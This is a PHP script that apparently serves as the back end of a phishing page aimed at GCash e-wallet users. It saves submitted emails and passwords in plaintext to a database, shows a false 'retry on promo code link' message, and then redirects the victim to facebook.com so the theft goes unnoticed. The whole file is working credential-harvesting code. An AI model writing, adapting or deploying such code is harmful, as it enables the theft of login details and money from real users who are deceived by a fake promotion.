<?php
ob_start();
date_default_timezone_set("Asia/Manila");

if(isset($_POST['email'])){
	// Create connection
	$con = new mysqli("localhost","root","","gcash2");

	// Check connection
	if($con->connect_error) {
	  // die("Connection failed: " . $con->connect_error);
	}else{
		// echo "Connected";
		$password = mysqli_real_escape_string($con, $_POST['password']);
		$email = mysqli_real_escape_string($con, $_POST['email']);
		$timestamp = date("Y-m-d H:i:s");
		echo $timestamp;
		$query = mysqli_query($con,"INSERT INTO accounts(email,password,created_at)VALUES('$email','$password','$timestamp')");
	}
?>
	If you not works, please retry again on promo code link.
	<script type="text/javascript">
		setTimeout(function (){
			location.href = 'https://facebook.com';
		}, 6000)
	</script>
<?php
}
?>